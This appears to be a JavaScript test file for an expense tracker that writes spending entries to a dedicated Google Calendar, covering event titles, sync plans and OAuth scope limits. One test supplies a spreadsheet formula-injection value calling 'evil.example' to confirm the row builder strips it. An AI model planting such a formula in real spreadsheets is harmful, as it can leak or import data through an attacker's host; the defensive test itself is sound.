const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const schema = require('../src/Schema.js');
const spend = require('../src/SpendCalendar.js');
const security = require('../src/Security.js');
const match = require('../src/Match.js');

test('expense titles match the spend calendar format', () => {
  assert.equal(spend.expenseEventTitle_({ name: '早餐', amount: 80, currency: 'TWD' }), '早餐 80');
  assert.equal(spend.expenseEventTitle_({ name: '早餐', amount: 80.5, currency: 'TWD' }), '早餐 80.5');
  assert.equal(
    spend.expenseEventTitle_({ name: 'ChatGPT', amount: 20, currency: 'USD', twd: 650.4 }),
    'ChatGPT 20 USD (≈NT$650)'
  );
  assert.equal(
    spend.expenseEventTitle_({ name: 'ChatGPT', amount: 20, currency: 'USD', twd: null }),
    'ChatGPT 20 USD'
  );
});

test('a clock time is a short event and a bare date is all-day', () => {
  const timed = spend.spendEventBody_({
    name: '早餐',
    amount: 80,
    currency: 'TWD',
    date: '2026-10-14',
    time: '08:30',
    timeZone: 'Asia/Taipei'
  });
  assert.equal(timed.summary, '早餐 80');
  assert.equal(timed.start.dateTime, '2026-10-14T08:30:00');
  assert.equal(timed.end.dateTime, '2026-10-14T09:00:00');
  assert.equal(timed.start.date, undefined);
  assert.equal(timed.extendedProperties.private.tsuke, 'spend');
  assert.equal(timed.description.includes('http'), false);

  const late = spend.addClockMinutes_('2026-10-14', '23:50', 30);
  assert.equal(late.date, '2026-10-15');
  assert.equal(late.time, '00:20');

  const allDay = spend.spendEventBody_({
    name: '早餐',
    amount: 80,
    currency: 'TWD',
    date: '2026-10-14',
    time: ''
  });
  assert.equal(allDay.start.date, '2026-10-14');
  assert.equal(allDay.end.date, '2026-10-15');
  assert.equal(allDay.start.dateTime, undefined);
});

test('sync updates stored events, creates missing ones, and deletes only Tsuke orphans', () => {
  const plan = spend.planSpendSync_([
    { rowNumber: 2, date: '2026-10-14', name: '早餐', amount: 80, currency: 'TWD', eventId: 'eventKeep1' },
    { rowNumber: 3, date: '2026-10-14', name: '午餐', amount: 120, currency: 'TWD', eventId: '' },
    { rowNumber: 4, date: '2026-10-13', name: '舊的', amount: 10, currency: 'TWD', eventId: 'missing999' }
  ], [
    { id: 'eventKeep1', marker: 'spend' },
    { id: 'orphan123', marker: 'spend' },
    { id: 'handmade1', marker: '' }
  ]);
  assert.deepEqual(plan.actions.map((action) => action.op), ['update', 'create', 'create']);
  assert.equal(plan.actions[0].eventId, 'eventKeep1');
  assert.deepEqual(plan.remove, ['orphan123']);
});

test('the event id column is stored only when it has a safe shape', () => {
  const row = security.buildEntryRow({
    row: 4,
    date: '2026-10-14',
    name: '早餐',
    amount: 80,
    currency: 'TWD',
    category: '吃',
    paymentCode: 'cube',
    paymentName: '範例信用卡 Cube',
    accountCode: '',
    cardCode: 'cube',
    tag: '',
    note: '',
    merchantKey: '早餐',
    createdAt: '2026-10-14 09:00:00',
    time: '08:30',
    eventId: '=IMPORTRANGE("https://evil.example","A1")'
  });
  assert.equal(row.length, schema.ENTRY_HEADERS.length);
  assert.equal(row[schema.ENTRY_COL.TIME - 1], '08:30');
  assert.equal(row[schema.ENTRY_COL.EVENT_ID - 1], '');
  assert.equal(schema.ENTRY_COL.TWD, 5);
  const kept = security.buildEntryRow({
    row: 4,
    date: '2026-10-14',
    name: '早餐',
    amount: 80,
    currency: 'TWD',
    category: '吃',
    paymentCode: 'cube',
    paymentName: '現金',
    accountCode: '',
    cardCode: '',
    tag: '',
    note: '',
    merchantKey: '早餐',
    createdAt: '2026-10-14 09:00:00',
    time: '',
    eventId: 'abcde_12'
  });
  assert.equal(kept[schema.ENTRY_COL.EVENT_ID - 1], 'abcde_12');
  const loaded = match.entriesFromRows([[
    '2026-10-14', '早餐', 80, 'TWD', 80, '吃', 'cube', '現金', '', '', '', '', '早餐', '2026-10-14 09:00:00', '08:30', "'abcde_12"
  ]]);
  assert.equal(loaded[0].time, '08:30');
  assert.equal(loaded[0].eventId, 'abcde_12');
});

test('the manifest still does not ask for the main calendar', () => {
  const manifest = JSON.parse(fs.readFileSync('appsscript.json', 'utf8'));
  assert.equal(manifest.oauthScopes.includes('https://www.googleapis.com/auth/calendar'), false);
  assert.equal(manifest.oauthScopes.includes('https://www.googleapis.com/auth/calendar.events'), false);
  assert.equal(manifest.oauthScopes.includes('https://www.googleapis.com/auth/calendar.app.created'), true);
  const source = fs.readFileSync('src/SpendCalendar.js', 'utf8');
  assert.equal(source.includes('primary'), false);
  assert.equal(source.includes('CalendarApp'), false);
  assert.equal(schema.SPEND_CALENDAR_NAME, 'Tsuke 花費');
});
